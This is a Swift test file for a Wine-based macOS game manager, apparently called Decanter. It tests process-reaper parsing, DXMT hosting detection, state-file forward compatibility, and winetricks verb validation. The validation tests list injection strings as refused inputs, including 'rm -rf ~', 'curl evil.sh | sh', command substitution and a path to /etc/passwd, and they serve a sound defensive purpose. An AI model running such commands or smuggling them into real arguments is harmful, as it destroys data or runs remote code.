import Foundation
import DecanterKit

/// The reaper decides what to SIGKILL, so its parsing is worth pinning down.
/// Every case here is taken from real `ps` output on this machine — including
/// the two that a naive split-on-spaces got wrong.
func runReaperTests(_ t: Harness) {
    t.suite("stray Wine processes")

    func stray(_ command: String, cpu: Double = 0, etime: String = "00:01") -> WineReaper.Stray {
        WineReaper.Stray(pid: 1, cpu: cpu, elapsed: etime, command: command,
                         prefix: nil, isService: false)
    }

    // ps reports elapsed time as [[dd-]hh:]mm:ss, and a leak is only obvious
    // once you can say "this has been running for six days".
    t.equal(WineReaper.Stray.seconds("00:30"), 30, "mm:ss")
    t.equal(WineReaper.Stray.seconds("02:30"), 150, "mm:ss with minutes")
    t.equal(WineReaper.Stray.seconds("01:02:30"), 3750, "hh:mm:ss")
    // Arithmetic in Int, then one conversion. Writing the same expression with
    // a Double target makes Swift consider every numeric overload for each
    // literal and operator, which it managed locally and gave up on in CI.
    let sixDaysish = TimeInterval(5 * 86_400 + 22 * 3_600 + 48 * 60 + 29)
    t.equal(WineReaper.Stray.seconds("05-22:48:29"), sixDaysish,
            "dd-hh:mm:ss — the shape a real leak has")
    t.equal(WineReaper.Stray.seconds("garbage"), 0, "unparseable elapsed time is 0, not a crash")

    // Wine relabels its own children with Windows paths.
    t.equal(stray(#"C:\windows\system32\services.exe"#).displayName, "services.exe",
            "a Windows path is reduced to its executable")
    t.equal(stray(#"C:\windows\system32\explorer.exe /desktop"#).displayName, "explorer.exe",
            "arguments are dropped")

    // The Mac-side binary lives under "Application Support", so splitting the
    // command on spaces used to name this process "Application".
    let ws = "/Users/x/Library/Application Support/Decanter/runtimes/gptk-7.7/bin/wineserver"
    t.equal(stray(ws).displayName, "wineserver",
            "a Mac path containing spaces still resolves to its binary")

    // The process that was pinned at 100% CPU for six days. Naming it
    // "wine64-preloader" or "wine.inf" would hide what is actually stuck.
    let hung = "/Users/x/Library/Application Support/Decanter/runtimes/gptk-7.7/bin/wine64-preloader"
        + #" C:\windows\system32\rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 \\?\unix\Users\x\share\wine\wine.inf"#
    t.equal(stray(hung).displayName, "rundll32.exe (installing wine.inf)",
            "a loader is named by what it is loading, not by argv[0]")

    // Live scan: must never report the process doing the scanning.
    let found = WineReaper(paths: Paths()).strays()
    let me = ProcessInfo.processInfo.processIdentifier
    t.expect(!found.contains { $0.pid == me }, "the scan never targets itself")
    t.expect(found.allSatisfy { $0.pid > 0 }, "every stray has a usable pid")
}

/// Recipe verbs were interpolated into a `sh -c` string, so anything after a
/// semicolon ran as a command. They now go through an argv array, and the verb
/// is validated as well — defence in depth, since the CLI takes arbitrary verbs
/// and winetricks itself would choke on the rest anyway.
func runRecipeVerbTests(_ t: Harness) {
    t.suite("winetricks verb validation")
    let ok = RecipeRunner.isValidVerb

    t.expect(ok("vcrun2019"), "an ordinary verb is allowed")
    t.expect(ok("lavfilters702"), "digits are allowed")
    t.expect(ok("d3dcompiler_47"), "underscores are allowed")
    t.expect(ok("dotnet48"), "a real preset verb is allowed")

    t.expect(!ok("vcrun; rm -rf ~"), "a shell separator is refused")
    t.expect(!ok("vcrun && curl evil.sh | sh"), "a command chain is refused")
    t.expect(!ok("$(whoami)"), "command substitution is refused")
    t.expect(!ok("`id`"), "backtick substitution is refused")
    t.expect(!ok("vcrun 2019"), "a space is refused")
    t.expect(!ok("../../etc/passwd"), "a path is refused")
    t.expect(!ok(""), "an empty verb is refused")
    t.expect(!ok(String(repeating: "a", count: 65)), "an absurdly long verb is refused")

    // Every shipped preset must survive its own validation.
    for (name, preset) in RecipeRunner.presets {
        for v in preset.verbs {
            t.expect(ok(v), "preset \(name) verb \(v) passes validation")
        }
    }
}

/// Whether a Wine build can host DXMT is a property of its binary — the macOS
/// driver's symbols are hidden unless the build exported them. Worth measuring
/// rather than asserting, since the README asserted it wrongly for a while.
func runMetalHostingTests(_ t: Harness) {
    t.suite("DXMT hosting capability")
    let mgr = RuntimeManager(paths: Paths())

    var checked = 0
    for r in (try? Store(paths: Paths()))?.state.runtimes ?? [] {
        let m = mgr.metalHosting(of: r)
        guard m.driverPath != nil else { continue }
        checked += 1
        // These two used to assert that capability implied the macdrv symbols.
        // It does not, and asserting it made the suite agree with a wrong
        // model: measured here, mainline Wine 11 hosts DXMT while exporting
        // none of them, and the Game Porting Toolkit exports all of them and
        // cannot host it. What must hold is that a capable driver is linkable.
        t.expect(!m.looksCapable || m.driverIsLinkable,
                 "\(r.id): capable implies the driver is a dylib, not a bundle")
        t.expect(m.exportedSymbols.allSatisfy { $0.contains("macdrv") || $0.contains("WineMetalView") },
                 "\(r.id): only relevant symbols are collected")
    }
    if checked == 0 { t.skip("DXMT hosting", "no pinned runtime with a macOS driver") }
    else { t.expect(true, "measured \(checked) runtime(s) for DXMT hosting") }

    // A runtime pointing nowhere must answer "no", not crash.
    let bogus = RuntimeSpec(id: "nope", kind: .wine, version: "0",
                            root: URL(filePath: "/nonexistent"),
                            winePath: URL(filePath: "/nonexistent/wine"),
                            wineserverPath: nil, supports32Bit: false,
                            backends: [], pinnedAt: Date())
    let m = mgr.metalHosting(of: bogus)
    t.expect(m.driverPath == nil, "a missing runtime has no driver")
    t.expect(!m.looksCapable, "…and is not reported as capable")
}

/// An older binary reading a newer state file used to drop every key it had no
/// property for, then write that loss back to disk. The app and the CLI are
/// separate binaries sharing one store and are routinely open together, so this
/// is a real path, not a hypothetical one.
func runForwardCompatTests(_ t: Harness) {
    t.suite("state survives an older binary")
    let fm = FileManager.default
    let root = fm.temporaryDirectory.appending(path: "decanter-fwd-\(UUID().uuidString)")
    defer { try? fm.removeItem(at: root) }
    let paths = Paths(root: root)
    try? paths.ensure()

    // A state file written by a hypothetical future version.
    let future = """
    {
      "games": [],
      "bottles": [],
      "runtimes": [],
      "templates": {},
      "cloudSyncToken": "abc123",
      "futureSettings": { "theme": "dark", "retries": 3 },
      "unrecognisedList": [1, 2, 3]
    }
    """
    try? future.write(to: paths.statePath, atomically: true, encoding: .utf8)

    guard let store = try? Store(paths: paths) else {
        t.expect(false, "the future state file loads"); return
    }
    t.expect(store.loadError == nil, "a file with unknown keys is not treated as corrupt")
    t.equal(store.state.unknownKeys.count, 3, "the three unknown keys are captured")

    // Write it back, exactly as any ordinary mutation would.
    try? store.mutate { $0.templateRuntimeID = "wine-11.0" }

    guard let raw = try? Data(contentsOf: paths.statePath),
          let obj = (try? JSONSerialization.jsonObject(with: raw)) as? [String: Any] else {
        t.expect(false, "the rewritten file is valid JSON"); return
    }
    t.expect(obj["cloudSyncToken"] as? String == "abc123",
             "an unknown string key survives the rewrite")
    t.expect(obj["unrecognisedList"] != nil, "an unknown array survives")
    if let nested = obj["futureSettings"] as? [String: Any] {
        t.equal(nested["theme"] as? String, "dark", "a nested unknown object survives intact")
        t.equal(nested["retries"] as? Int, 3, "…including its numbers")
    } else {
        t.expect(false, "the nested unknown object survives")
    }
    t.equal(obj["templateRuntimeID"] as? String, "wine-11.0",
            "and the change we actually made was written")

    // Known keys must always win: preserved data cannot shadow real state.
    t.expect(obj["games"] as? [Any] != nil, "known keys are still written normally")
}

/// An unknown *enum case* is as breaking as an unknown key, and only the second
/// was guarded against.
///
/// This is not hypothetical. Shipping DXMT put `"dxmt"` into `state.json`, and
/// the installed 0.3.1 app — which had no such case — threw while decoding
/// `runtimes`, so it opened on an empty library beside a CLI that could see
/// everything. The app and the CLI are separate binaries sharing one store and
/// are routinely different versions.
func runUnknownCaseTests(_ t: Harness) {
    t.suite("an older binary survives a backend it has never heard of")

    // A runtime and a bottle written by some future version, using a graphics
    // layer this build does not know.
    let future = """
    {"id":"wine-99","kind":"wine","version":"99","root":"file:///tmp/w",
     "winePath":"file:///tmp/w/bin/wine","supports32Bit":true,
     "backends":["dxvk","tomorrowd3d","wined3d"],"pinnedAt":0}
    """
    guard let spec = try? JSONDecoder().decode(RuntimeSpec.self, from: Data(future.utf8)) else {
        t.expect(false, "a runtime with an unknown backend still decodes"); return
    }
    t.equal(spec.id, "wine-99", "the runtime decodes rather than throwing")
    t.equal(spec.backends.count, 2, "the two known backends are kept")
    t.expect(spec.backends.contains(.dxvk) && spec.backends.contains(.wined3d),
             "…and they are the right two")
    t.equal(spec.unknownBackends, ["tomorrowd3d"], "the unknown one is set aside, not dropped")

    // Round-tripping through this binary must not cost the newer one anything.
    guard let out = try? JSONEncoder().encode(spec),
          let text = String(data: out, encoding: .utf8) else {
        t.expect(false, "the runtime re-encodes"); return
    }
    t.expect(text.contains("tomorrowd3d"),
             "the unknown backend survives a round trip through a binary that cannot use it")

    let futureBottle = """
    {"id":"\(UUID().uuidString)","prefixPath":"file:///tmp/p","runtimeID":"wine-99",
     "backend":"tomorrowd3d","appliedRecipes":[],"generation":3,"health":"healthy","createdAt":0}
    """
    guard let bottle = try? JSONDecoder().decode(Bottle.self, from: Data(futureBottle.utf8)) else {
        t.expect(false, "a bottle with an unknown backend still decodes"); return
    }
    t.equal(bottle.generation, 3, "the bottle decodes rather than throwing")
    t.equal(bottle.backend, .wined3d, "it falls back to a backend this binary can actually run")
    t.equal(bottle.unknownBackend, "tomorrowd3d", "…while remembering what it really was")
    if let out = try? JSONEncoder().encode(bottle),
       let text = String(data: out, encoding: .utf8) {
        t.expect(text.contains("tomorrowd3d"),
                 "and writes the original name back, not the fallback")
        t.expect(!text.contains("\"backend\":\"wined3d\""),
                 "…so the newer binary finds the game exactly as it left it")
    }

    // A whole state file, which is the shape the real failure took.
    let state = """
    {"runtimes":[\(future)],"games":[],"bottles":[\(futureBottle)]}
    """
    let decoded = try? JSONDecoder().decode(DecanterState.self, from: Data(state.utf8))
    t.equal(decoded?.runtimes.count, 1, "one unknown backend does not empty the runtime list")
    t.equal(decoded?.bottles.count, 1, "…nor the bottle list")
}
